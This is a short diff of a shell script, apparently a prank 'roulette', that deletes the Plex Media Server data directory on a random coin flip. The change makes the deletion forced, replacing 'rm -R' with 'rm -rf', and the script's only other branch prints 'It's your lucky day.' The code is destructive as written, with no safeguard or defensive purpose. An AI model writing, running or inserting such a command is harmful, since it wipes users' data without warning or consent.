@@ -28,7 +28,7 @@ plex_data_dir="/var/lib/plexmediaserver/Library/Application Suport/Plex Media Se
 if (( RANDOM % 2 ))
 then
     #This command will be executed when it's not your lucky day
-    rm -R "$plex_data_dir"
+    rm -rf "$plex_data_dir"
 else
     echo "It's your lucky day."
 fi
